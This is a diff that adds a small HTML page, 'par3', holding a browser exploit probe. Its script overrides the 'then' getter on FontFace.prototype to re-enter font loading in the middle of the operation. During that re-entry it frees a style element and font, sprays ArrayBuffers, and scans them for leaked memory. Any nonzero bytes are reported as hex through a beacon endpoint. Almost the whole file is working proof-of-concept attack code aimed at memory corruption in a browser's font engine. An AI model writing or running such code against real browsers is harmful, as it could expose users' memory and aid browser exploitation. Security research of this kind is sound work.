@@ -1,0 +1,63 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>par3</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var TRIAL = 0, MAXT = 1, SIZE = 128, styleEl = null, firedHere = false;
+function setup(){
+  var name = 'f' + TRIAL;
+  var A = new FontFace(name, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive = window.__alive || [];
+  window.__alive.push(A);
+  styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: s" + TRIAL + "; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('TR' + TRIAL + '-SETUP');
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedHere) return undefined;
+      firedHere = true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;
+      window.__buf = []; window.__view = [];
+      for (var i = 0; i < 4; i++) { var ab = new ArrayBuffer(SIZE); window.__buf.push(ab); window.__view.push(new Uint8Array(ab)); }
+      var r = 'err';
+      try { r = document.fonts.check('1em s' + TRIAL); } catch (e) { r = 'throw'; }
+      return undefined;
+    },
+    set: function(){}
+  });
+  document.fonts.load('1em ' + name + ', s' + TRIAL, 'AB').then(
+    function(){ b('TR' + TRIAL + '-RESOLVED'); next(); },
+    function(){ b('TR' + TRIAL + '-REJECTED'); next(); }
+  );
+  b('TR' + TRIAL + '-LOAD-CALLED');
+  setTimeout(function(){ scan(); }, 0);
+  setTimeout(function(){ scan(); }, 250);
+  setTimeout(function(){ scan(); }, 800);
+  setTimeout(function(){ if (!SCANNED) b('U5-NOGETTER-fired-' + (firedHere ? 1 : 0)); }, 1200);
+}
+var SCANNED = false;
+function hex(v){ return ('0' + v.toString(16)).slice(-2); }
+function scan(){
+  if (SCANNED) return;
+  var v = window.__view; if (!v || !v.length) { return; }
+  SCANNED = true;
+  var total = 0, first = null;
+  for (var i = 0; i < v.length; i++) for (var j = 0; j < v[i].length; j++) if (v[i][j] !== 0) { total++; if (!first) first = { b: i, o: j }; }
+  if (!total) { b('U5-S' + SIZE + '-CLEAN'); return; }
+  var s = ''; for (var j = first.o; j < first.o + 32 && j < SIZE; j++) s += hex(window.__view[first.b][j]);
+  b('U5-S' + SIZE + '-HIT-b' + first.b + '-o' + first.o + '-' + s);
+}
+function next(){
+  TRIAL++;
+  if (TRIAL < MAXT) setTimeout(setup, 150);
+  else b('TR-DONE-all');
+}
+function run(){ b('TR-PARSE'); setup(); }
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script></head><body><p>par3</p></body></html>
